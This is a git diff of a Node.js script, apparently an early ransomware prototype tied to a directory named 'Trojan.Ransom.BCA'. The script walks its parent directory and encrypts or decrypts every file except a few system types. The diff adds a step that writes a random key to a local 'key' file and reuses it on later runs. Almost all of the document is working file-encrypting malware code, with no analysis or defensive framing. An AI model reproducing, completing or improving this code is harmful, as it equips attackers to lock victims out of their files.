@@ -2,9 +2,10 @@ const fs = require('fs');
 const crypto = require('crypto');
 const path = require('path');
 const parentDir = __dirname + "/../";
-const key = crypto.randomBytes(6).toString('base64');
+const newKey = crypto.randomBytes(6).toString('base64');
 
-function encrypt (pathIn) {
+function encrypt (pathIn, key) {
+
     const oldName = pathIn.split('/').pop();
     if (oldName.slice(-1) !== "*") {
         console.log("Encrypt: " + key);
@@ -23,7 +24,7 @@ function encrypt (pathIn) {
     }
 }
 
-function decrypt (pathIn) {
+function decrypt (pathIn, key) {
     const oldName = pathIn.split('/').pop();
     fs.readFile(pathIn, "binary", function (err, data) {
         if (err) throw err;
@@ -52,39 +53,49 @@ function decrypt (pathIn) {
 }
 
 function search (mode) {
-    // Loop through all the files in the temp directory
-    fs.readdir( parentDir, function( err, files ) {
-        if( err ) {
+    fs.readdir( parentDir, function(err, files) {
+        if(err) {
             console.error("Could not list the directory.", err );
             process.exit( 1 );
         }
 
-        files.forEach( function( file, index ) {
-            // Make one pass and make the file complete
-            let fromPath = path.join( parentDir, file );
+        let key;
+        fs.readFile("key", "utf8", function (err, data) {
+            if (err) {
+                fs.writeFile("key", newKey, (err) => {if (err) throw err});
+                key = newKey;
+            } else {
+                key = data;
+                console.log(key);
+            }
 
-            fs.stat( fromPath, function( error, stat ) {
-                if( error ) {
-                    console.error( "Error stating file.", error );
-                    return;
-                }
+            files.forEach(function(file, index) {
+                let fromPath = path.join(parentDir, file);
 
-                if( stat.isFile() ) {
-                    console.log( "'%s' is a file.", fromPath );
-
-                    let extension = file.split('.').pop();
-                    if (file !== ".DS_Store" && extension !== "app" && extension !== "localized" && extension !== "ini") {
-                        if (mode === 0) encrypt(fromPath); else decrypt(fromPath);
+                fs.stat(fromPath, function(err, stat) {
+                    if (err) {
+                        console.error("Error stating file.", err);
+                        return;
                     }
-                } else if(stat.isDirectory()) {
+
+                    if(stat.isFile()) {
+                        console.log("'%s' is a file.", fromPath);
+
+                        let extension = file.split('.').pop();
+                        if (file !== ".DS_Store" && extension !== "app" && extension !== "localized" && extension !== "ini") {
+                            if (mode === 0) encrypt(fromPath, key);
+                            else if (mode === 1) decrypt(fromPath, key);
+                        }
+                    } else if(stat.isDirectory()) {
                     console.log( "'%s' is a directory.", fromPath );
                     if (file !== "Trojan.Ransom.BCA")
-                        return;
+                        console.log("Not trojan");
                 }
 
-            } );
-        } );
-    } );
+                });
+            });
+        });
+    });
 }
 
 /*function process (key) {
